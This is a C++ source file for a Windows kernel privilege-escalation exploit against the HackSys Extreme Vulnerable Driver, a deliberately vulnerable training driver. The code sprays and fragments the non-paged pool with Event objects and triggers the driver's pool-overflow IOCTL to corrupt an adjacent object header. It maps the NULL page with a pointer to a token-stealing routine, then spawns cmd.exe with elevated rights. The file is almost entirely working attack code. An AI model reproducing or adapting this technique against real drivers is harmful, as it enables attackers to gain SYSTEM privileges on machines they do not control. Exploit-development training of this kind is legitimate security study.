#include <stdio.h>
#include <Windows.h>
#include <vector>
// #include <iostream>

using namespace std;

extern "C" VOID StealToken(void);

#define DEVICE_NAME L"\\\\.\\HackSysExtremeVulnerableDriver"
#define HACKSYS_EVD_IOCTL_NON_PAGED_POOL_OVERFLOW 0x22200F

typedef NTSTATUS(WINAPI* PNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG ZeroBits,
    PULONG AllocationSize,
    ULONG AllocationType,
    ULONG Protect
    );

vector<HANDLE> defragmentHandles;
vector<HANDLE> sequentialHandles;

HANDLE GetDeviceHandle()
{
    HANDLE hRet = NULL;
    hRet = CreateFile(
        DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
        NULL
    );

    if (hRet == INVALID_HANDLE_VALUE) {
        printf("[-] Error open device with error code: %x.\n", GetLastError());
        exit(-1);
    }

    return hRet;
}

void SprayPool()
{
    printf("[+] Spraying pool to defragment...\n");
    for (int i = 0; i < 10000; ++i) {
        HANDLE result = CreateEvent(
            NULL,
            0,
            0,
            L""
        );

        if (!result) {
            printf("[-] Failed to allocating Event Object during defragmentation.\n");
            exit(-1);
        }

        defragmentHandles.push_back(result);
    }
    printf("[+] Defragmentation spray complete.\n");\
    
    printf("[+] Spraying sequential allocation...\n");
    for (int i = 0; i < 10000; ++i) {
        HANDLE result = CreateEvent(
            NULL,
            0,
            0,
            L""
        );

        if (!result) {
            printf("[-} Failed to allocating Event Object during sequential.\n");
            exit(-1);
        }

        sequentialHandles.push_back(result);
    }
    printf("[+] Sequential spray complete.\n");

    printf("[+] Poking 0x200 byte-sized hols in sequential allocation...\n");
    for (UINT32 i = 0; i < sequentialHandles.size(); i = i + 0x10) {
        for (UINT32 j = 0; j < 8; ++j) {
            BOOL freed = CloseHandle(sequentialHandles[i + j]);
            if (freed == FALSE) {
                printf("[-] Failed to free sequential allocation.\n");
                printf("[-] Last Error: %x.\n", GetLastError());
                exit(-1);
            }
        }
    }
    printf("[+] Holes poked.\n");
}

void SendPayload(HANDLE hFile)
{
    ULONG payloadLen = 0x1f8 + 0x28;

    BYTE *buf = (BYTE *)VirtualAlloc(
        NULL,
        payloadLen + 1,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    );
    if (buf == NULL) {
        printf("[-] Failed to alloc memory.\n");
        exit(-1);
    }

    BYTE overwrieteBytes[] = {
        0x40, 0x00, 0x08, 0x04,
        0x45, 0x76, 0x65, 0xee,
        0x00, 0x00, 0x00, 0x00,
        0x40, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00,
        0x01, 0x00, 0x00, 0x00,
        0x01, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x08, 0x00
    };

    memset(buf, '\x42', payloadLen);
    memcpy(buf + 0x1f8, overwrieteBytes, 0x28);

    DWORD bytesRet = 0;
    int result = DeviceIoControl(
        hFile,
        HACKSYS_EVD_IOCTL_NON_PAGED_POOL_OVERFLOW,
        buf,
        payloadLen,
        NULL,
        0,
        &bytesRet,
        NULL
    );

    if (!result) {
        printf("[-] Error in DeviceIoControl.\n");
        exit(-1);
    }
}

void FreePool()
{
    printf("[+] Freeing defragmentation allocations...\n");
    for (UINT32 i = 0; i < defragmentHandles.size(); i++) {

        BOOL freed = CloseHandle(defragmentHandles[i]);
        if (freed == false) {
            printf("[-] Unable to free defragment allocation!\n");
            printf("[-] Last error: %x", GetLastError());
            exit(-1);
        }
    }
    printf("[+] Defragmentation allocations freed.\n");
    printf("[+] Freeing sequential allocations...\n");
    for (UINT32 i = 0; i < sequentialHandles.size(); i = i + 0x10) {
        for (UINT32 j = 8; j < 0x10; ++j) {
            BOOL freed = CloseHandle(sequentialHandles[i + j]);
            if (freed == false) {
                printf("[-] Unable to free sequential allocation!\n");
                printf("[-] Last error: %x", GetLastError());
                exit(-1);
            }
        }
    }
    printf("[+] Sequential allocations freed.\n");
}

void AllocateShellCode()
{
    // Get function NtAllocateVirtualMemory address
    HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
    if (ntdll == NULL) {
        printf("[-] Failed to get handle of ntdll.dll.\n");
        exit(-1);
    }

    PNtAllocateVirtualMemory NtAllocateVirtualMemory =
        (PNtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
    if (NtAllocateVirtualMemory == NULL) {
        printf("[-] Failed to export NtAllocateVirutalMemory.\n");
        exit(-1);
    }
    printf("[+] Found address of NtAllocateVirtualMemory: %p.\n", NtAllocateVirtualMemory);

    // Allocate NULL page
    LPVOID baseAddress = (LPVOID)0x1;
    ULONG allocSize = 0x1000;
    NTSTATUS status = NtAllocateVirtualMemory(
        GetCurrentProcess(),
        &baseAddress,
        0,
        &allocSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    printf("status: %x.\n", status);

    DWORD dummy;
    if (!VirtualProtect(0x0, 0x1000, PAGE_EXECUTE_READWRITE, &dummy)) {
        printf("[-] Failed to allocate the NULL page.\n");
        exit(-1);
    }
    printf("[+] Successfully allocate the NULL page.\n");

    memset(0, 0, 0x78);
    *(PULONG32)(0x60) = (ULONG32)StealToken;
}

int main()
{
    HANDLE hFile = GetDeviceHandle();

    SprayPool();

    SendPayload(hFile);

    AllocateShellCode();

    FreePool();
    
    system("cmd.exe");

    return 0;
}